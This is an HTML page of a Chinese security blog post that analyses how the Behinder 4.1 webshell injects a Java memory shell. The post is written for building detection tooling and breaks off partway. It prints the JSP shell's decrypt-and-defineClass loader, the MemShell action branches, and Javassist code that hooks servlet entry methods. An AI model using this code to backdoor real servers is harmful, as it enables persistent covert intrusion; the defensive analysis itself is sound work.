@@ -1,0 +1,1117 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="m0b1u3">
+  <meta name="keywords" content="冰蝎4.1,Behinder 4.1,Java内存马,内存马注入链,Java Agent内存马,Instrumentation,Javassist,JSP Shell,Java安全,内存马检测">
+  
+    <meta name="description" content="拆解冰蝎 4.1 在 Java 场景下的内存马注入链，聚焦 JSP Shell、Javassist、Instrumentation 与 Agent 注入路径的关键衔接点。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="冰蝎 4.1 Java 内存马注入链分析">
+<meta property="og:url" content="https://pwned.icu/2026/06/10/%E5%86%B0%E8%9D%8E4.1-Java%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="TraceSec">
+<meta property="og:description" content="拆解冰蝎 4.1 在 Java 场景下的内存马注入链，聚焦 JSP Shell、Javassist、Instrumentation 与 Agent 注入路径的关键衔接点。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1257215598.cos.ap-chengdu.myqcloud.com/hexo/20260611001647698.webp?imageSlim">
+<meta property="article:published_time" content="2026-06-10T08:54:01.000Z">
+<meta property="article:modified_time" content="2026-06-10T16:34:53.128Z">
+<meta property="article:author" content="m0b1u3">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="冰蝎">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog-1257215598.cos.ap-chengdu.myqcloud.com/hexo/20260611001647698.webp?imageSlim">
+  
+  
+  
+  <title>冰蝎 4.1 Java 内存马注入链分析 - TraceSec</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pwned.icu","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":"https://cloud.umami.is/script.js","website_id":"1e530efa-be6e-417c-8adb-cc3475c9efed","domains":"pwned.icu","start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"woyaola":null,"cnzz":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        let umami = document.createElement('script');
+        umami.async = true;
+        umami.src = "https://cloud.umami.is/script.js";
+        umami.setAttribute("data-website-id", "1e530efa-be6e-417c-8adb-cc3475c9efed");
+        umami.setAttribute("data-domains", "pwned.icu");
+        document.head.appendChild(umami);
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="TraceSec" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong> </strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-1257215598.cos.ap-chengdu.myqcloud.com/hexo/20250603231510062.webp?imageSlim') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="冰蝎 4.1 Java 内存马注入链分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-06-10 16:54" pubdate>
+          2026年6月10日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          13k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          108 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">冰蝎 4.1 Java 内存马注入链分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="冰蝎-4-1-Java-内存马注入链分析"><a href="#冰蝎-4-1-Java-内存马注入链分析" class="headerlink" title="冰蝎 4.1 Java 内存马注入链分析"></a>冰蝎 4.1 Java 内存马注入链分析</h1><blockquote>
+<p>最近正在开发 Java 内存马扫描分析工具。<br>这次翻冰蝎 4.1，不是为了复现攻击链，而是想把它在 JVM 里动了哪些东西弄明白。只有先知道它怎么塞进去、塞到哪儿，后面写扫描和拦截逻辑才不会只靠猜。</p>
+</blockquote>
+<p><img src="https://blog-1257215598.cos.ap-chengdu.myqcloud.com/hexo/20260610165401583.webp?imageSlim" srcset="/img/loading.gif" lazyload alt="Java 内存马注入流程中文图"></p>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">1. 背景：为什么不能只扫 Web 组件<br>2. 入口层：JSP Shell 与 MemShell 调度<br>   2.1 JSP Shell 如何执行 Payload<br>   2.2 注入时 shell.jsp 怎么执行 MemShell<br>   2.3 MemShell 里的 action 分支<br>   2.4 action=get 如何探测入口类<br>3. 字节码改造：classBody 怎么变成 Hook 版<br>   3.1 客户端用 Javassist 生成新 classBody<br>   3.2 具体 Hook 哪些方法<br>   3.3 插入进去的逻辑长什么样<br>4. 注入层：AgentNoFile 与 Agent 两条路径<br>   4.1 AgentNoFile 无文件注入<br>   4.2 Agent 落地 Jar 注入<br>5. 注入流程图<br>6. 防检测 antiAgent<br>7. 扫描工具可以怎么落地<br>8. 总结<br></code></pre></td></tr></table></figure>
+
+<h2 id="1-背景：为什么不能只扫-Web-组件"><a href="#1-背景：为什么不能只扫-Web-组件" class="headerlink" title="1. 背景：为什么不能只扫 Web 组件"></a>1. 背景：为什么不能只扫 Web 组件</h2><p>一开始做 Java 内存马扫描，很容易把注意力全放在 Filter、Servlet、Listener 这些运行时注册表上。</p>
+<p>这条路当然要查，但冰蝎 4.1 的 Agent 注入链说明，只查这些还不够。它不一定老老实实注册一个新 Filter，而是可以直接改 JVM 里已经加载好的请求入口类。</p>
+<p>这种思路更像是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">请求入口类 Hook 型内存马<br></code></pre></td></tr></table></figure>
+
+<p>要看的不只是“容器里多了什么组件”，还要看：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">原本的 HttpServlet / ServletStubImpl 有没有被重新定义<br></code></pre></td></tr></table></figure>
+
+<p>所以工具侧不能只枚举组件，还得能看关键类的字节码有没有被人动过。</p>
+<h2 id="2-入口层：JSP-Shell-与-MemShell-调度"><a href="#2-入口层：JSP-Shell-与-MemShell-调度" class="headerlink" title="2. 入口层：JSP Shell 与 MemShell 调度"></a>2. 入口层：JSP Shell 与 MemShell 调度</h2><p>这一层先看三个问题：请求是怎么进来的，注入时 <code>shell.jsp</code> 怎么把 <code>MemShell</code> 跑起来，以及跑起来以后由哪个 <code>action</code> 分支接着处理。</p>
+<h3 id="2-1-JSP-Shell-如何执行-Payload"><a href="#2-1-JSP-Shell-如何执行-Payload" class="headerlink" title="2.1 JSP Shell 如何执行 Payload"></a>2.1 JSP Shell 如何执行 Payload</h3><p>冰蝎服务端 JSP 模板不长，但里面有一个很值得盯的点：动态类加载。</p>
+<p>以 <code>server/shell.jsp</code> 为例，里面会先准备一个很小的 ClassLoader：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>    U(ClassLoader c) &#123;<br>        <span class="hljs-built_in">super</span>(c);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">g</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>请求进来以后，再把请求体解密，然后直接喂给这个 ClassLoader：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Cipher</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>c.init(<span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(k.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>));<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">U</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader())<br>    .g(c.doFinal(base64Decode(requestBody)))<br>    .newInstance()<br>    .equals(pageContext);<br></code></pre></td></tr></table></figure>
+
+<p>也就是说，这个 JSP 入口大概是这么跑的：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">POST 加密请求体<br>-&gt; JSP AES 解密<br>-&gt; ClassLoader#defineClass 动态加载 payload<br>-&gt; newInstance()<br>-&gt; equals(pageContext) 执行<br></code></pre></td></tr></table></figure>
+
+<p>这里可以先记一个很直接的检测点：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">请求线程内 defineClass + equals(pageContext)<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-2-注入时-shell-jsp-怎么执行-MemShell"><a href="#2-2-注入时-shell-jsp-怎么执行-MemShell" class="headerlink" title="2.2 注入时 shell.jsp 怎么执行 MemShell"></a>2.2 注入时 shell.jsp 怎么执行 MemShell</h3><p>注入内存马时，<code>shell.jsp</code> 自己不是内存马本体，它更像一个远程 class 执行入口。</p>
+<p>冰蝎客户端点击注入后，会把要执行的 Java payload 加密后 POST 到 <code>shell.jsp</code>。<code>shell.jsp</code> 做完 Base64 和 AES 解密后，拿到的是一段 class 字节码，然后通过前面的 <code>U.g(...)</code> 直接 <code>defineClass</code> 加载进当前 JVM。</p>
+<p>这一步加载的 payload，注入链里主要就是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">net.rebeyond.behinder.payload.java.MemShell<br></code></pre></td></tr></table></figure>
+
+<p>所以注入时的执行关系可以拆成这样：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">冰蝎客户端点击注入<br>-&gt; 发送加密后的 MemShell class<br>-&gt; shell.jsp 解密请求体<br>-&gt; defineClass 加载 MemShell<br>-&gt; newInstance()<br>-&gt; equals(pageContext)<br>-&gt; MemShell.equals() 开始执行<br>-&gt; 根据 action 进入 get / injectAgent / injectAgentNoFile<br></code></pre></td></tr></table></figure>
+
+<p>换句话说，<code>shell.jsp</code> 只负责把客户端发来的 class 跑起来。真正决定“探测入口类、生成注入参数、执行 Agent 注入”的，是后面被动态加载的 <code>MemShell</code>。</p>
+<p>这个关系对扫描工具也很重要：不要只看 <code>shell.jsp</code> 文件里有没有 <code>injectAgent</code> 字符串。很多时候 JSP 里只有 AES、Base64、<code>defineClass</code> 和 <code>equals(pageContext)</code>，真正的注入逻辑是请求里动态送进去的。</p>
+<h3 id="2-3-MemShell-里的-action-分支"><a href="#2-3-MemShell-里的-action-分支" class="headerlink" title="2.3 MemShell 里的 action 分支"></a>2.3 MemShell 里的 action 分支</h3><p>Java 内存马注入这块，主要逻辑集中在这个类里：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">net.rebeyond.behinder.payload.java.MemShell<br></code></pre></td></tr></table></figure>
+
+<p>翻这个类时，先看这几组字段：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String action;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String type;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String className;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String classBody;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String libPath;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String password;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String antiAgent;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String path;<br></code></pre></td></tr></table></figure>
+
+<p>最值得关注的是这几个 <code>action</code>：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">action=get<br>action=injectAgent<br>action=injectAgentNoFile<br></code></pre></td></tr></table></figure>
+
+<p>后面整条链路怎么走，基本就是看 <code>action</code> 的值。</p>
+<h3 id="2-4-action-get-如何探测入口类"><a href="#2-4-action-get-如何探测入口类" class="headerlink" title="2.4 action&#x3D;get 如何探测入口类"></a>2.4 action&#x3D;get 如何探测入口类</h3><p>冰蝎不是上来就硬改。它会先问目标 JVM：你这里能找到哪个请求入口类？</p>
+<p>目标端 <code>MemShell</code> 的 <code>action=get</code> 分支，会按顺序去读这几个 class 资源：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] targetClassArr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<br>    <span class="hljs-string">&quot;/weblogic/servlet/internal/ServletStubImpl.class&quot;</span>,<br>    <span class="hljs-string">&quot;/jakarta/servlet/http/HttpServlet.class&quot;</span>,<br>    <span class="hljs-string">&quot;/javax/servlet/http/HttpServlet.class&quot;</span><br>&#125;;<br><br><span class="hljs-keyword">for</span> (String targetClass : targetClassArr) &#123;<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getClass().getResourceAsStream(targetClass);<br>    <span class="hljs-keyword">if</span> (in == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    result.put(<span class="hljs-string">&quot;className&quot;</span>, targetClass);<br>    result.put(<span class="hljs-string">&quot;classBody&quot;</span>, base64encode(classBytes));<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以它实际盯上的就是这三个候选类：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">weblogic.servlet.internal.ServletStubImpl<br>jakarta.servlet.http.HttpServlet<br>javax.servlet.http.HttpServlet<br></code></pre></td></tr></table></figure>
+
+<p>这里有个点很容易误会：这一步返回的 <code>classBody</code> 还不是“内存马字节码”。它只是目标 JVM 里原始入口类的字节码。</p>
+<h2 id="3-字节码改造：classBody-怎么变成-Hook-版"><a href="#3-字节码改造：classBody-怎么变成-Hook-版" class="headerlink" title="3. 字节码改造：classBody 怎么变成 Hook 版"></a>3. 字节码改造：classBody 怎么变成 Hook 版</h2><p>拿到原始入口类以后，下一步就是把它改成带 Hook 的版本。这一段发生在客户端侧，也是后面做字节码检测时最值得细看的地方。</p>
+<h3 id="3-1-客户端用-Javassist-生成新-classBody"><a href="#3-1-客户端用-Javassist-生成新-classBody" class="headerlink" title="3.1 客户端用 Javassist 生成新 classBody"></a>3.1 客户端用 Javassist 生成新 classBody</h3><p>不看 JNDI 插件的话，Hook 版 <code>classBody</code> 是在冰蝎客户端侧生成的，位置在：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">net.rebeyond.behinder.ui.controller.MainController.injectAgentNoFile(...)<br></code></pre></td></tr></table></figure>
+
+<p>这段逻辑做的事很直接：拿到 <code>action=get</code> 返回的原始类字节码，然后用 Javassist 往入口方法前面插一段代码。</p>
+<p>把代码还原成容易看的流程，大概是这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">JSONObject</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> shellService.getMemShellTargetClass();<br><br><span class="hljs-type">JSONObject</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(result.getString(<span class="hljs-string">&quot;msg&quot;</span>));<br><br><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> msg.getString(<span class="hljs-string">&quot;className&quot;</span>)<br>    .replaceFirst(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    .replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>)<br>    .replace(<span class="hljs-string">&quot;.class&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-type">String</span> <span class="hljs-variable">classBody</span> <span class="hljs-operator">=</span> msg.getString(<span class="hljs-string">&quot;classBody&quot;</span>);<br><span class="hljs-type">byte</span>[] originBytes = Base64.getDecoder().decode(classBody);<br><br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>pool.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayClassPath</span>(className, originBytes));<br><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.get(className);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">targetConfig</span> <span class="hljs-operator">=</span> targetClasses.get(className);<br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> targetConfig.get(<span class="hljs-string">&quot;methodName&quot;</span>).toString();<br>List&lt;String&gt; paramList = (List&lt;String&gt;) targetConfig.get(<span class="hljs-string">&quot;paramList&quot;</span>);<br><br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(methodName, paramTypes);<br></code></pre></td></tr></table></figure>
+
+<p>拿到 <code>CtMethod</code> 之后，客户端会拼出要塞进去的那段逻辑：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ICrypt</span> <span class="hljs-variable">cryptor</span> <span class="hljs-operator">=</span> shellService.getCryptor();<br><br><span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> String.format(<br>    Constants.shellCodeWithDecrypt,<br>    path,<br>    Base64.getEncoder().encodeToString(cryptor.getDecodeClsBytes()),<br>    <span class="hljs-string">&quot;Decrypt&quot;</span><br>);<br></code></pre></td></tr></table></figure>
+
+<p>然后把它插到目标方法开头：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">method.insertBefore(code);<br><br><span class="hljs-type">byte</span>[] modifiedBytes = ctClass.toBytecode();<br><br><span class="hljs-type">String</span> <span class="hljs-variable">newClassBody</span> <span class="hljs-operator">=</span><br>    Base64.getEncoder().encodeToString(modifiedBytes);<br></code></pre></td></tr></table></figure>
+
+<p>这一段串起来就是：</p>
